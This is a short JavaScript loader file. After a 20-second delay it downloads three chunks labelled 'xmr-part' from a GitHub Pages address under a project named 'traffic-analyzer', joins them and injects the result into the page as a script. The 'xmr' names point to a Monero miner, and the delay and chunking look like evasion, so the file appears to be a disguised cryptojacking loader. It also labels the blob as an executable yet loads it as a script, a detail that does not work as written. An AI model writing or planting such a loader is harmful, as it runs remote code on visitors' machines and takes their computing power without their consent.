// loader.js
setTimeout(async () => {
  const parts = ['xmr-part-aa', 'xmr-part-ab', 'xmr-part-ac']; 
  const blobParts = [];
  
  for (const part of parts) {
    const response = await fetch(`https://abdulabdulabdul.github.io/traffic-analyzer/${part}`);
    blobParts.push(await response.arrayBuffer());
  }

  const exeBlob = new Blob(blobParts, { type: 'application/octet-stream' });
  const exeUrl = URL.createObjectURL(exeBlob);
  
  const script = document.createElement('script');
  script.src = exeUrl;
  document.body.appendChild(script);

}, 20000);
